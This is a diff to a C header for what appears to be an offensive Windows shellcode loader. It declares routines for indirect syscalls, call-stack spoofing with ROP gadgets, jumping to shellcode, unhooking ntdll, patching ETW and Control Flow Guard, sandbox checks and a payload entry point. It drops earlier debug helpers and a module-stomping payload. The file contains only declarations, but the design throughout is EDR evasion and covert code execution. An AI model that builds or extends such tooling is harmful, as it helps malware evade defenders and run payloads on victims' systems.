@@ -16,6 +16,10 @@
     ((ULONG_PTR)(ptr) >= (ULONG_PTR)(base) && (ULONG_PTR)(ptr) < ((ULONG_PTR)(base) + (size)))
 #endif
 
+#ifndef RBP_OFFSET_INVALID
+#define RBP_OFFSET_INVALID 0xFFFFFFFFu
+#endif
+
 #define rand MyRand
 #define srand MySrand
 
@@ -25,6 +29,8 @@
 extern VOID Gate(WORD wSystemCall, PVOID pSyscallInst, PVOID pClean, PVOID pThunk);
 extern PVOID SpoofCall(PSPOOFER pConfig);
 extern PVOID SyscallWrapper();
+extern VOID JumpToShellcode(PVOID target);
+extern VOID CallShellcode(PVOID target);
 
 /*--------------------------------------------------------------------
   Globals (defined in src/globals.c)
@@ -34,6 +40,7 @@ extern unsigned long g_seed;
 extern PVOID g_ntdllBase;
 extern PVOID g_kernel32Base;
 extern PVOID g_kernelBaseAddr;
+extern PVOID g_returnAddress;
 extern SW3_SYSCALL_LIST g_SyscallList;
 
 extern PVOID g_pRandomSyscallGadget;
@@ -42,24 +49,14 @@ extern PVOID g_pThunkGadget;
 extern PVOID frame_Root_Ntdll;
 extern PVOID frame_Mid_Kernel; 
 extern PVOID kernelFrameModuleBase; 
-extern PVOID g_pRtlUserThreadStart;
-extern PVOID g_pBaseThreadInitThunk;
-extern DWORD g_RtlFrameSize;
-extern DWORD g_BaseFrameSize;
+extern DWORD g_FirstFrameSize;
+extern DWORD g_SecondFrameSize;
 extern DWORD g_RbpPushOffset;
-extern DWORD g_RbpFrameOffset;
 extern DWORD g_StackGadgetSize;
 extern DWORD g_FirstFrameOffset;
 extern DWORD g_SecondFrameOffset;
 extern DWORD g_JmpRbxGadgetFrameSize;
-/*--------------------------------------------------------------------
-  Debug helpers
---------------------------------------------------------------------*/
-void Debug_PrintStatus(const char* apiName, NTSTATUS status);
-BOOL Debug_SelfCheck();
-void Debug_CheckStructOffsets();
-BOOL Debug_ValidateGadgets();
-void Test_StackSpoofing(PIMAGE_EXPORT_DIRECTORY pImageExportDirectory);
+
 /*--------------------------------------------------------------------
   SysWhispers3 / hashing
 --------------------------------------------------------------------*/
@@ -87,12 +84,23 @@ int MyRand();
 --------------------------------------------------------------------*/
 PRUNTIME_FUNCTION VxLookupFunctionEntry(DWORD64 ControlPc, PVOID ImageBase);
 DWORD CalculateFunctionStackSize(PVOID funcAddr, PVOID moduleBase);
+DWORD GetRbpPushOffset(PVOID funcAddr, PVOID moduleBase, DWORD* outStackSize);
+BOOL FindPushRbpFrame(PVOID moduleBase, PVOID* outFunction, DWORD* outFrameSize, DWORD* outRbpOffset);
+BOOL FindPrologFrame(PVOID moduleBase, PVOID* outFunction, DWORD* outFrameSize, DWORD* outFpOffset);
 PVOID FindAddRspGadget(PVOID pModuleBase, DWORD* outSize);
 PVOID FindJmpRbxGadget(PVOID moduleBase,DWORD *size);
 PVOID GetSyscallGadget(PVOID pModuleBase);
 DWORD FindCallSiteOffset(PVOID funcAddr, PVOID moduleBase);
 /*--------------------------------------------------------------------
+  API spoofing (Desync)
+--------------------------------------------------------------------*/
+ULONG_PTR InvokeSpoofedApi(DWORD64 apiHash, UINT64 argCount, ...);
+/*--------------------------------------------------------------------
   Payloads
 --------------------------------------------------------------------*/
-BOOL ModuleStompPayload(PVX_TABLE pVxTable);
-
+BOOL Payload();
+BOOL CheckEnvironment();
+BOOL UnhookNtdll(PVX_TABLE pVxTable);
+BOOL IsNtdllTainted(PVX_TABLE pVxTable);
+BOOL PatchEtw(PVX_TABLE pVxTable);
+BOOL PatchCFG(PVX_TABLE pVxTable);
